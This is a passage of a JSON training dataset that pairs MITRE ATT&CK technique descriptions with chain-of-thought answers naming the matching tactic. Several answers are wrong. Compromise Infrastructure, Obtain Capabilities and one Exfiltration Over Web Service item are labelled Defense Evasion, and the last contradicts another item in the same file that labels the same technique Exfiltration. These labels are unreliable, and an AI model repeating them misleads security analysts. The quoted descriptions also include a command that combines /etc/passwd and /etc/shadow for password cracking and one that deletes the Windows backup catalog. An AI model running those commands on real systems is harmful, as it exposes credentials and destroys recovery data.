      "answer": "The given description is related to sub technique: Process Argument Spoofing (T1564.010);\nSub technique Process Argument Spoofing (T1564.010) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
    "context": "",
    "output": "The given description is related to sub technique: Exfiltration Over Bluetooth (T1011.001);\nSub technique Exfiltration Over Bluetooth (T1011.001) is a type of technique Exfiltration Over Other Network Medium (T1011);\nTechnique Exfiltration Over Other Network Medium (T1011) is a type of tactic Exfiltration (TA0010);\nTherefore, the given description is related to tactic Exfiltration (TA0010).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
      "answer": "The given description is related to sub technique: Exfiltration Over Bluetooth (T1011.001);\nSub technique Exfiltration Over Bluetooth (T1011.001) is a type of technique Exfiltration Over Other Network Medium (T1011);\nTechnique Exfiltration Over Other Network Medium (T1011) is a type of tactic Exfiltration (TA0010);\nTherefore, the given description is related to tactic Exfiltration (TA0010).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. \n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
    "context": "",
    "output": "The given description is related to sub technique Password Spraying (T1110.003);\nSub technique Password Spraying (T1110.003) is a type of technique Brute Force (T1110);\nTechnique Brute Force (T1110) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. \n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
      "answer": "The given description is related to sub technique Password Spraying (T1110.003);\nSub technique Password Spraying (T1110.003) is a type of technique Brute Force (T1110);\nTechnique Brute Force (T1110) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.\n\nCreating Cloud Accounts may also require adversaries to establish Email Accounts to register with the cloud provider.",
    "context": "",
    "output": "The given description is related to sub technique Cloud Accounts (T1585.003);\nSub technique Cloud Accounts (T1585.003) is a type of technique Establish Accounts (T1585);\nTechnique Establish Accounts (T1585) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.\n\nCreating Cloud Accounts may also require adversaries to establish Email Accounts to register with the cloud provider.",
      "answer": "The given description is related to sub technique Cloud Accounts (T1585.003);\nSub technique Cloud Accounts (T1585.003) is a type of technique Establish Accounts (T1585);\nTechnique Establish Accounts (T1585) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs). Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, PowerShell provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.?",
    "context": "",
    "output": "The given description is related to sub technique: Windows File and Directory Permissions Modification (T1222.001);\nSub technique Windows File and Directory Permissions Modification (T1222.001) is a type of technique File and Directory Permissions Modification (T1222);\nTechnique File and Directory Permissions Modification (T1222) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs). Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, PowerShell provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via Accessibility Features, Boot or Logon Initialization Scripts, or tainting/hijacking other instrumental binary/configuration files via Hijack Execution Flow.",
      "answer": "The given description is related to sub technique: Windows File and Directory Permissions Modification (T1222.001);\nSub technique Windows File and Directory Permissions Modification (T1222.001) is a type of technique File and Directory Permissions Modification (T1222);\nTechnique File and Directory Permissions Modification (T1222) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the \u201cparent-child\" relationship for detection, breaking this relationship could result in the adversary\u2019s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs. \n\nOn Linux systems, adversaries may execute a series of Native API calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the `fork()` API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the `init` system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree.\n\nAnother example is using the \u201cdaemon\u201d syscall to detach from the current parent process and run in the background.",
    "context": "",
    "output": "The given description is related to sub technique Break Process Trees (T1036.009);\nSub technique Break Process Trees (T1036.009) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - An adversary may attempt to evade process tree-based analysis by modifying executed malware's parent process ID (PPID). If endpoint protection software leverages the \u201cparent-child\" relationship for detection, breaking this relationship could result in the adversary\u2019s behavior not being associated with previous process tree activity. On Unix-based systems breaking this process tree is common practice for administrators to execute software using scripts and programs. \n\nOn Linux systems, adversaries may execute a series of Native API calls to alter malware's process tree. For example, adversaries can execute their payload without any arguments, call the `fork()` API call twice, then have the parent process exit. This creates a grandchild process with no parent process that is immediately adopted by the `init` system process (PID 1), which successfully disconnects the execution of the adversary's payload from its previous process tree.\n\nAnother example is using the \u201cdaemon\u201d syscall to detach from the current parent process and run in the background.",
      "answer": "The given description is related to sub technique Break Process Trees (T1036.009);\nSub technique Break Process Trees (T1036.009) is a type of technique Masquerading (T1036);\nTechnique Masquerading (T1036) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.\n\nVictims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.\n\nAdversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to tailor pretexts to be even more persuasive and believable for the victim.",
    "context": "",
    "output": "The given description is related to sub technique Spearphishing Voice (T1598.004);\nSub technique Spearphishing Voice (T1598.004) is a type of technique Phishing for Information (T1598);\nTechnique Phishing for Information (T1598) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.\n\nVictims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.\n\nAdversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to tailor pretexts to be even more persuasive and believable for the victim.",
      "answer": "The given description is related to sub technique Spearphishing Voice (T1598.004);\nSub technique Spearphishing Voice (T1598.004) is a type of technique Phishing for Information (T1598);\nTechnique Phishing for Information (T1598) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not Initial Access to that environment -- instead leveraging these devices to support additional targeting.\n\nOnce an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads for Phishing campaigns (i.e., Link Target) or enabling the required access to execute Content Injection operations. Adversaries may also be able to harvest reusable credentials (i.e., Valid Accounts) from compromised network devices.\n\nAdversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses.\n\nCompromised network devices may be used to support subsequent Command and Control activity, such as Hide Infrastructure through an established Proxy and/or Botnet network.",
    "context": "",
    "output": "The given description is related to sub technique Network Devices (T1584.008);\nSub technique Network Devices (T1584.008) is a type of technique Compromise Infrastructure (T1584);\nTechnique Compromise Infrastructure (T1584) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not Initial Access to that environment -- instead leveraging these devices to support additional targeting.\n\nOnce an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads for Phishing campaigns (i.e., Link Target) or enabling the required access to execute Content Injection operations. Adversaries may also be able to harvest reusable credentials (i.e., Valid Accounts) from compromised network devices.\n\nAdversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses.\n\nCompromised network devices may be used to support subsequent Command and Control activity, such as Hide Infrastructure through an established Proxy and/or Botnet network.",
      "answer": "The given description is related to sub technique Network Devices (T1584.008);\nSub technique Network Devices (T1584.008) is a type of technique Compromise Infrastructure (T1584);\nTechnique Compromise Infrastructure (T1584) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.\n\nIn addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals. In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).\n\nAn adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).?",
    "context": "",
    "output": "The given description is related to sub technique: Exploits (T1588.005);\nSub technique Exploits (T1588.005) is a type of technique Obtain Capabilities (T1588);\nTechnique Obtain Capabilities (T1588) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.\n\nIn addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals. In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).\n\nAn adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).",
      "answer": "The given description is related to sub technique: Exploits (T1588.005);\nSub technique Exploits (T1588.005) is a type of technique Obtain Capabilities (T1588);\nTechnique Obtain Capabilities (T1588) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.\n\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper: <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>",
    "context": "",
    "output": "The given description is related to sub technique: /etc/passwd and /etc/shadow (T1003.008);\nSub technique /etc/passwd and /etc/shadow (T1003.008) is a type of technique OS Credential Dumping (T1003);\nTechnique OS Credential Dumping (T1003) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.\n\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper: <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>",
      "answer": "The given description is related to sub technique: /etc/passwd and /etc/shadow (T1003.008);\nSub technique /etc/passwd and /etc/shadow (T1003.008) is a type of technique OS Credential Dumping (T1003);\nTechnique OS Credential Dumping (T1003) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server. Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello. When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application. \n\nAdversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated Automated Exfiltration of emails, chat messages, and other data. Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.\n\nAccess to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.",
    "context": "",
    "output": "The given description is related to sub technique Exfiltration Over Webhook (T1567.004);\nSub technique Exfiltration Over Webhook (T1567.004) is a type of technique Exfiltration Over Web Service (T1567);\nTechnique Exfiltration Over Web Service (T1567) is a type of tactic Exfiltration (TA0010);\nTherefore, the given description is related to tactic Exfiltration (TA0010).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server. Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello. When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application. \n\nAdversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated Automated Exfiltration of emails, chat messages, and other data. Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.\n\nAccess to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.",
      "answer": "The given description is related to sub technique Exfiltration Over Webhook (T1567.004);\nSub technique Exfiltration Over Webhook (T1567.004) is a type of technique Exfiltration Over Web Service (T1567);\nTechnique Exfiltration Over Web Service (T1567) is a type of tactic Exfiltration (TA0010);\nTherefore, the given description is related to tactic Exfiltration (TA0010).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin.com</code>, are commonly used by developers to share code and other information.  \n\nText storage sites are often used to host malicious code for C2 communication (e.g., Stage Capabilities), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.\n\n**Note:** This is distinct from Exfiltration to Code Repository, which highlight access to code repositories via APIs.?",
    "context": "",
    "output": "The given description is related to sub technique: Exfiltration to Text Storage Sites (T1567.003);\nSub technique Exfiltration to Text Storage Sites (T1567.003) is a type of technique Exfiltration Over Web Service (T1567);\nTechnique Exfiltration Over Web Service (T1567) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin.com</code>, are commonly used by developers to share code and other information.  \n\nText storage sites are often used to host malicious code for C2 communication (e.g., Stage Capabilities), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.\n\n**Note:** This is distinct from Exfiltration to Code Repository, which highlight access to code repositories via APIs.",
      "answer": "The given description is related to sub technique: Exfiltration to Text Storage Sites (T1567.003);\nSub technique Exfiltration to Text Storage Sites (T1567.003) is a type of technique Exfiltration Over Web Service (T1567);\nTechnique Exfiltration Over Web Service (T1567) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt. MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.\n\nFor example, <code>mmc C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved console msc file in author mode. Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window. \n\nAdversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. Inhibit System Recovery) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).\n\nAdversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a Component Object Model class object. Then, adversaries may create custom consoles with the \u201cLink to Web Address\u201d snap-in that is linked to the malicious CLSID subkey. Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>.?",
    "context": "",
    "output": "The given description is related to sub technique: MMC (T1218.014);\nSub technique MMC (T1218.014) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt. MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.\n\nFor example, <code>mmc C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved console msc file in author mode. Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window. \n\nAdversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. Inhibit System Recovery) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).\n\nAdversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a Component Object Model class object. Then, adversaries may create custom consoles with the \u201cLink to Web Address\u201d snap-in that is linked to the malicious CLSID subkey. Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>.",
      "answer": "The given description is related to sub technique: MMC (T1218.014);\nSub technique MMC (T1218.014) is a type of technique System Binary Proxy Execution (T1218);\nTechnique System Binary Proxy Execution (T1218) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
    "context": "",
    "output": "The given description is related to sub technique: Exfiltration over USB (T1052.001);\nSub technique Exfiltration over USB (T1052.001) is a type of technique Exfiltration Over Physical Medium (T1052);\nTechnique Exfiltration Over Physical Medium (T1052) is a type of tactic Exfiltration (TA0010);\nTherefore, the given description is related to tactic Exfiltration (TA0010).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
      "answer": "The given description is related to sub technique: Exfiltration over USB (T1052.001);\nSub technique Exfiltration over USB (T1052.001) is a type of technique Exfiltration Over Physical Medium (T1052);\nTechnique Exfiltration Over Physical Medium (T1052) is a type of tactic Exfiltration (TA0010);\nTherefore, the given description is related to tactic Exfiltration (TA0010).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  }
]